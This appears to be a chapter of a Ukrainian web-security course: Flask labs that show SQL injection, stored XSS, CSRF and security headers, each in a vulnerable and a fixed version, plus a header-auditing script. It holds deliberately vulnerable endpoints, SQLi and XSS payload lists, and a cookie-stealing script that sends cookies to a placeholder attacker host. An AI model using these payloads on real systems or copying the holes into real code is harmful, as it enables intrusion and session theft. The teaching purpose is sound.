# 6.12. Практична лабораторна на Python

Чотири лабораторні роботи: вразливий Flask-застосунок зі SQLi → захищена версія, XSS і CSP, CSRF-захист, Security Headers middleware. Кожна лаба показує **до** (вразливий код) і **після** (захищений код) з поясненням.

**Залежності:**
```bash
pip install flask flask-sqlalchemy flask-wtf flask-limiter flask-login \
            argon2-cffi bleach
```

---

## Лабораторна 6.12.1: SQLi — від вразливості до захисту

```python
"""
sqli_demo.py — демонстрація SQL Injection і правильного захисту.
НЕ РОЗГОРТАЙТЕ vulnerable версію в інтернеті!
"""
from flask import Flask, request, jsonify, g
from flask_sqlalchemy import SQLAlchemy
import sqlite3
import os

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///demo.db'
db = SQLAlchemy(app)


class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    role = db.Column(db.String(20), default='user')


with app.app_context():
    db.create_all()
    # Seed demo data
    if not User.query.first():
        db.session.add_all([
            User(username='alice', email='alice@example.com', role='user'),
            User(username='admin', email='admin@example.com', role='admin'),
            User(username='bob', email='bob@example.com', role='user'),
        ])
        db.session.commit()


# ─────────────────────────────────────────────────────────────
# ВРАЗЛИВИЙ ENDPOINT (для демонстрації — НІКОЛИ не робіть так)
# ─────────────────────────────────────────────────────────────
@app.route('/api/v1/vulnerable/users/search')
def search_users_vulnerable():
    """
    ❌ ВРАЗЛИВО до SQL Injection!
    
    Тест: /api/v1/vulnerable/users/search?q=' OR '1'='1
    Результат: повертає ВСІХ користувачів
    
    Тест: /api/v1/vulnerable/users/search?q=' UNION SELECT id,email,role FROM users--
    Результат: витік email і ролей
    """
    q = request.args.get('q', '')
    # ❌ Пряма конкатенація — SQL Injection!
    raw_query = f"SELECT id, username FROM user WHERE username LIKE '%{q}%'"
    
    try:
        conn = sqlite3.connect('demo.db')
        cursor = conn.execute(raw_query)
        results = [{'id': row[0], 'username': row[1]} for row in cursor.fetchall()]
        conn.close()
        return jsonify({
            'query': raw_query,   # ← ніколи не розкривайте SQL в production!
            'results': results
        })
    except Exception as e:
        return jsonify({'error': str(e), 'query': raw_query}), 500


# ─────────────────────────────────────────────────────────────
# ЗАХИЩЕНИЙ ENDPOINT
# ─────────────────────────────────────────────────────────────
@app.route('/api/v1/secure/users/search')
def search_users_secure():
    """
    ✅ Захищено: параметризований запит через SQLAlchemy ORM
    
    Тест: /api/v1/secure/users/search?q=' OR '1'='1
    Результат: порожній список (escape виконується автоматично)
    """
    q = request.args.get('q', '').strip()
    
    # Валідація вхідних даних
    if len(q) < 2:
        return jsonify({'error': 'Мінімум 2 символи для пошуку'}), 400
    if len(q) > 50:
        return jsonify({'error': 'Максимум 50 символів'}), 400
    
    # ✅ Параметризований ORM запит — SQLAlchemy екранує автоматично
    users = User.query.filter(
        User.username.ilike(f'%{q}%')
    ).with_entities(User.id, User.username).all()
    
    return jsonify({
        'results': [{'id': u.id, 'username': u.username} for u in users],
        'count': len(users)
    })


# ─────────────────────────────────────────────────────────────
# ДЕМОНСТРАЦІЯ SQLi PAYLOAD-ів
# ─────────────────────────────────────────────────────────────
SQLI_PAYLOADS = [
    ("Basic bypass", "' OR '1'='1"),
    ("Comment", "admin'--"),
    ("Union select", "' UNION SELECT 1,email FROM user--"),
    ("Boolean blind", "' AND 1=1--"),
    ("Time-based", "'; SELECT SLEEP(5)--"),
]

@app.route('/api/v1/demo/sqli-payloads')
def show_payloads():
    """Демонстрація payload-ів (без виконання)."""
    return jsonify({
        'explanation': 'Ці payload-и демонструють SQLi атаки. '
                       'Перевірте /vulnerable endpoint, потім /secure для порівняння.',
        'payloads': [{'name': n, 'payload': p} for n, p in SQLI_PAYLOADS],
        'test_urls': {
            'vulnerable': '/api/v1/vulnerable/users/search?q=' + SQLI_PAYLOADS[0][1],
            'secure': '/api/v1/secure/users/search?q=' + SQLI_PAYLOADS[0][1],
        }
    })


if __name__ == '__main__':
    app.run(debug=False, port=5001)
```

**Завдання:**
1. Запустіть застосунок і порівняйте відповіді вразливого і захищеного endpoint для payload `' OR '1'='1`.
2. Спробуйте payload `' UNION SELECT id,email,role FROM user--` — чи отримуєте email-адреси з вразливого endpoint?
3. Поясніть: чому SQLAlchemy ORM захищає від SQLi за замовчуванням, але можна «зламати» захист при використанні `db.execute(f"...")`?

---

## Лабораторна 6.12.2: XSS і CSP захист

```python
"""
xss_csp_demo.py — демонстрація XSS і CSP захисту у Flask.
"""
from flask import Flask, request, render_template_string, g, escape
import secrets
import bleach

app = Flask(__name__)

# Allowed HTML tags для bleach (WYSIWYG editor use case)
ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a', 'p', 'br']
ALLOWED_ATTRS = {'a': ['href', 'title']}

# Симуляція бази коментарів (in-memory)
comments: list[dict] = []

# ─── CSP Nonce Middleware ─────────────────────────────────────
@app.before_request
def generate_nonce():
    g.csp_nonce = secrets.token_urlsafe(16)

@app.after_request
def set_security_headers(response):
    nonce = getattr(g, 'csp_nonce', '')
    csp = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "
        f"style-src 'self' 'nonce-{nonce}'; "
        f"img-src 'self' data:; "
        f"frame-ancestors 'none'; "
        f"object-src 'none';"
    )
    response.headers.update({
        'Content-Security-Policy': csp,
        'X-Frame-Options': 'DENY',
        'X-Content-Type-Options': 'nosniff',
        'Referrer-Policy': 'strict-origin-when-cross-origin',
    })
    return response


# ─── ВРАЗЛИВИЙ шаблон (Stored XSS) ──────────────────────────
VULNERABLE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>Вразливі коментарі</title></head>
<body>
<h1>❌ Вразливі коментарі (без escape)</h1>
<form method="POST" action="/xss/vulnerable/comment">
    <textarea name="comment" placeholder="Введіть коментар..."></textarea>
    <button type="submit">Надіслати</button>
</form>
<h2>Коментарі:</h2>
{% for c in comments %}
    <div class="comment">{{ c.text | safe }}</div>  {# ← safe вимикає escape! #}
{% endfor %}
<p><a href="/xss/secure">Захищена версія →</a></p>
</body>
</html>
"""

# ─── ЗАХИЩЕНИЙ шаблон ────────────────────────────────────────
SECURE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>Захищені коментарі</title></head>
<body>
<h1>✅ Захищені коментарі</h1>
<script nonce="{{ nonce }}">
    // Лише скрипти з nonce виконуються (CSP захист)
    console.log('CSP nonce активний');
</script>
<form method="POST" action="/xss/secure/comment">
    <textarea name="comment" placeholder="Введіть коментар..."></textarea>
    <button type="submit">Надіслати</button>
</form>
<h2>Коментарі:</h2>
{% for c in comments %}
    <div class="comment">{{ c.text }}</div>  {# ← автоматичний escape Jinja2 #}
{% endfor %}
<p><a href="/xss/vulnerable">Вразлива версія →</a></p>
</body>
</html>
"""


@app.route('/xss/vulnerable', methods=['GET', 'POST'])
def xss_vulnerable():
    """❌ Вразливий endpoint — збережений XSS."""
    if request.method == 'POST':
        text = request.form.get('comment', '')
        comments.append({'text': text, 'safe': False})
    return render_template_string(VULNERABLE_TEMPLATE, comments=comments)


@app.route('/xss/secure', methods=['GET', 'POST'])
def xss_secure():
    """✅ Захищений endpoint — Jinja2 escape + bleach для HTML."""
    if request.method == 'POST':
        text = request.form.get('comment', '').strip()
        # Опція 1: plain text (автоматично екранується Jinja2)
        # Опція 2: sanitized HTML через bleach (якщо потрібна розмітка)
        sanitized = bleach.clean(text, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS)
        comments.append({'text': sanitized, 'safe': True})
    return render_template_string(SECURE_TEMPLATE, comments=comments, nonce=g.csp_nonce)


@app.route('/xss/demo-payloads')
def xss_payloads():
    """Демонстрація XSS payload-ів."""
    payloads = [
        ("Basic alert", "<script>alert('XSS')</script>"),
        ("Image onerror", "<img src=x onerror=alert(1)>"),
        ("SVG", "<svg onload=alert(1)>"),
        ("Cookie theft", "<script>fetch('//attacker.com?c='+document.cookie)</script>"),
        ("DOM XSS", "<a href='javascript:alert(1)'>Click me</a>"),
    ]
    from flask import jsonify
    return jsonify({
        'instructions': [
            '1. Відкрийте /xss/vulnerable і вставте payload нижче',
            '2. Перейдіть до /xss/vulnerable — payload виконається',
            '3. Відкрийте /xss/secure і вставте той самий payload',
            '4. Переконайтесь, що escape або CSP блокує виконання'
        ],
        'payloads': [{'name': n, 'payload': p} for n, p in payloads]
    })


if __name__ == '__main__':
    app.run(debug=False, port=5002)
```

---

## Лабораторна 6.12.3: CSRF-захист і захищена форма

```python
"""
csrf_demo.py — CSRF-захист через Flask-WTF.
"""
from flask import Flask, render_template_string, redirect, url_for, flash, session
from flask_wtf import FlaskForm, CSRFProtect
from wtforms import StringField, IntegerField, validators
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
app.config['WTF_CSRF_ENABLED'] = True

csrf = CSRFProtect(app)

# Симуляція "балансу" (in-memory)
accounts = {'alice': 1000, 'bob': 500, 'attacker': 0}


class TransferForm(FlaskForm):
    recipient = StringField('Одержувач', [
        validators.DataRequired(),
        validators.Length(min=2, max=50),
        validators.Regexp(r'^[a-zA-Z0-9_]+$', message='Тільки букви, цифри і _')
    ])
    amount = IntegerField('Сума', [
        validators.DataRequired(),
        validators.NumberRange(min=1, max=10000)
    ])


TRANSFER_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Захищений переказ</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
</head>
<body>
<h1>Банківський переказ (захищений CSRF-токеном)</h1>
<p>Ваш баланс: <b>{{ balance }} грн</b></p>

{% with messages = get_flashed_messages(with_categories=true) %}
  {% for category, msg in messages %}
    <p style="color: {{ 'green' if category == 'success' else 'red' }}">{{ msg }}</p>
  {% endfor %}
{% endwith %}

<form method="POST">
    {{ form.hidden_tag() }}  <!-- CSRF токен тут -->
    <label>Одержувач: {{ form.recipient() }}</label><br>
    <label>Сума: {{ form.amount() }}</label><br>
    <button type="submit">Переказати</button>
</form>

<h2>Всі баланси:</h2>
<ul>
{% for name, bal in accounts.items() %}
    <li>{{ name }}: {{ bal }} грн</li>
{% endfor %}
</ul>

<hr>
<h2>❌ Симуляція CSRF атаки:</h2>
<p>Наступна форма симулює атаку з evil.com — вона <strong>НЕ</strong> матиме CSRF-токен:</p>
<form action="/transfer" method="POST" id="csrf-attack">
    <input type="hidden" name="recipient" value="attacker">
    <input type="hidden" name="amount" value="999">
    <!-- Немає csrf_token! -->
    <button type="submit">Атака (буде заблокована)</button>
</form>
</body>
</html>
"""


@app.route('/transfer', methods=['GET', 'POST'])
def transfer():
    session['current_user'] = 'alice'  # симуляція сесії
    current_user = session.get('current_user', 'alice')
    form = TransferForm()

    if form.validate_on_submit():  # ← перевіряє і дані форми, і CSRF токен
        recipient = form.recipient.data
        amount = form.amount.data

        if recipient not in accounts:
            flash(f'Одержувача "{recipient}" не знайдено', 'error')
        elif accounts[current_user] < amount:
            flash('Недостатньо коштів', 'error')
        else:
            accounts[current_user] -= amount
            accounts[recipient] = accounts.get(recipient, 0) + amount
            flash(f'✅ Переказано {amount} грн → {recipient}', 'success')

    elif request.method == 'POST':
        # форма не пройшла validate — перевіряємо причину
        if form.errors.get('csrf_token'):
            flash('❌ CSRF атака заблокована! Невалідний CSRF токен.', 'error')
        else:
            flash(f'Помилка валідації: {form.errors}', 'error')

    return render_template_string(
        TRANSFER_TEMPLATE,
        form=form,
        balance=accounts.get(current_user, 0),
        accounts=accounts
    )


if __name__ == '__main__':
    app.run(debug=False, port=5003)
```

**Завдання:**
1. Натисніть «Переказати» зі штатною формою — переказ пройде.
2. Натисніть кнопку «Атака» — переконайтесь, що 400/403 повертається через відсутній CSRF токен.
3. Знайдіть у HTML вихідному коді hidden-поле `csrf_token` — яке значення? Чи однакове воно при оновленні сторінки?

---

## Лабораторна 6.12.4: Security Headers Checker

```python
"""
security_headers_checker.py — аудит Security Headers для будь-якого URL.
pip install requests
"""
import requests
import json
from dataclasses import dataclass
from typing import Optional


@dataclass
class HeaderCheck:
    name: str
    severity: str  # CRITICAL, HIGH, MEDIUM, INFO
    present: bool
    value: Optional[str]
    recommendation: str
    issue: Optional[str] = None


def analyze_csp(csp_value: str) -> list[str]:
    """Аналіз Content-Security-Policy на небезпечні директиви."""
    issues = []
    if "'unsafe-inline'" in csp_value and 'script-src' in csp_value:
        issues.append("'unsafe-inline' у script-src знищує захист від XSS")
    if "'unsafe-eval'" in csp_value:
        issues.append("'unsafe-eval' дозволяє виконання рядків як коду")
    if 'default-src *' in csp_value or "default-src '*'" in csp_value:
        issues.append("default-src * — надто широко, дозволяє завантаження з будь-якого домену")
    if 'frame-ancestors' not in csp_value:
        issues.append("Відсутній frame-ancestors — немає захисту від Clickjacking через CSP")
    if 'object-src' not in csp_value:
        issues.append("Відсутній object-src — Flash/Java applets можуть завантажуватись")
    return issues


def check_security_headers(url: str) -> list[HeaderCheck]:
    try:
        response = requests.get(url, timeout=15, allow_redirects=True,
                                headers={'User-Agent': 'SecurityAudit/1.0'})
    except requests.RequestException as e:
        return [HeaderCheck("Connection", "CRITICAL", False, None, f"Помилка підключення: {e}")]

    headers = {k.lower(): v for k, v in response.headers.items()}
    checks = []

    # ─── HSTS ────────────────────────────────────────────────
    hsts = headers.get('strict-transport-security')
    issues = []
    if hsts:
        if 'max-age=0' in hsts:
            issues.append("max-age=0 вимикає HSTS!")
        elif 'max-age=' in hsts:
            age = int(hsts.split('max-age=')[1].split(';')[0].split(' ')[0])
            if age < 15552000:  # 6 місяців
                issues.append(f"max-age={age} занадто малий (рекомендовано 31536000+)")
        if 'includesubdomains' not in hsts.lower():
            issues.append("Відсутній includeSubDomains")
    checks.append(HeaderCheck(
        "Strict-Transport-Security", "CRITICAL", bool(hsts), hsts,
        "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
        '; '.join(issues) if issues else None
    ))

    # ─── CSP ─────────────────────────────────────────────────
    csp = headers.get('content-security-policy')
    csp_issues = analyze_csp(csp) if csp else ["CSP відсутній — немає захисту від XSS"]
    checks.append(HeaderCheck(
        "Content-Security-Policy", "CRITICAL", bool(csp), csp,
        "default-src 'self'; script-src 'self' 'nonce-{random}'; ...",
        '; '.join(csp_issues) if csp_issues else None
    ))

    # ─── X-Frame-Options ────────────────────────────────────
    xfo = headers.get('x-frame-options')
    checks.append(HeaderCheck(
        "X-Frame-Options", "HIGH", bool(xfo), xfo,
        "X-Frame-Options: DENY",
        "Clickjacking можливий (якщо відсутній frame-ancestors у CSP)" if not xfo else None
    ))

    # ─── X-Content-Type-Options ─────────────────────────────
    xcto = headers.get('x-content-type-options')
    checks.append(HeaderCheck(
        "X-Content-Type-Options", "HIGH", bool(xcto), xcto,
        "X-Content-Type-Options: nosniff",
        "MIME sniffing можливий" if not xcto else None
    ))

    # ─── Referrer-Policy ────────────────────────────────────
    rp = headers.get('referrer-policy')
    checks.append(HeaderCheck(
        "Referrer-Policy", "MEDIUM", bool(rp), rp,
        "Referrer-Policy: strict-origin-when-cross-origin",
        "URL параметри можуть витікати через Referer" if not rp else None
    ))

    # ─── Permissions-Policy ─────────────────────────────────
    pp = headers.get('permissions-policy') or headers.get('feature-policy')
    checks.append(HeaderCheck(
        "Permissions-Policy", "MEDIUM", bool(pp), pp,
        "Permissions-Policy: camera=(), microphone=(), geolocation=()"
    ))

    # ─── Небажані заголовки (info disclosure) ───────────────
    for bad_header in ['server', 'x-powered-by', 'x-aspnet-version', 'x-generator']:
        if bad_header in headers:
            checks.append(HeaderCheck(
                f"⚠️ Info Disclosure: {bad_header}", "MEDIUM", True, headers[bad_header],
                f"Приховати заголовок {bad_header} (розкриває технології)",
                f"Значення '{headers[bad_header]}' допомагає зловмиснику таргетувати атаки"
            ))

    return checks


def print_report(url: str) -> None:
    checks = check_security_headers(url)
    ICONS = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "INFO": "[i]"}

    print(f"\n{'='*65}")
    print(f"Security Headers Аудит: {url}")
    print(f"{'='*65}")

    counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0}
    for c in checks:
        icon = ICONS.get(c.severity, '•')
        status = "✅" if (c.present and not c.issue) else ("⚠️ " if c.present and c.issue else "❌")
        print(f"\n{status} [{c.severity}] {c.name}")
        if c.value:
            print(f"   Значення: {c.value[:80]}")
        if c.issue:
            print(f"   ⚠️  Проблема: {c.issue}")
        if not c.present or c.issue:
            print(f"   💡 Рекомендація: {c.recommendation}")
            if c.severity in counts and (not c.present or c.issue):
                counts[c.severity] += 1

    print(f"\n{'='*65}")
    print(f"Результат: {counts['CRITICAL']} критичних | {counts['HIGH']} високих | {counts['MEDIUM']} середніх")

    score = max(0, 100 - counts['CRITICAL']*25 - counts['HIGH']*10 - counts['MEDIUM']*5)
    grade = 'A+' if score >= 95 else 'A' if score >= 85 else 'B' if score >= 70 else 'C' if score >= 50 else 'F'
    print(f"Оцінка: {grade} ({score}/100)")


if __name__ == '__main__':
    import sys
    url = sys.argv[1] if len(sys.argv) > 1 else 'https://diia.gov.ua'
    print_report(url)
    print(f"\nЗалишилось: Порівняйте з securityheaders.com/{url.replace('https://', '')}")
```

**Завдання:**
1. Запустіть `python security_headers_checker.py https://diia.gov.ua` і порівняйте з будь-яким комерційним банком.
2. Запустіть проти `http://localhost:5001` (Flask з lab 1 без headers) — яку оцінку отримає?
3. Додайте у lab 1 Flask middleware з security headers і перевірте знову.

## Джерела та додаткові матеріали

- Flask-WTF (flask-wtf.readthedocs.io) — CSRF і Forms.
- Bleach (bleach.readthedocs.io) — HTML sanitization.
- Flask-Limiter (flask-limiter.readthedocs.io) — rate limiting.
- PortSwigger Web Academy — безкоштовні лабораторні для XSS, SQLi, CSRF.

---

**Попередній розділ:** [6.11. API Security](11-api-security.md)
**Далі:** [6.13. Чек-лист і самоперевірка](13-chek-lyst-i-samoperevirka.md)
**Назад до модуля:** [README модуля 06](README.md)
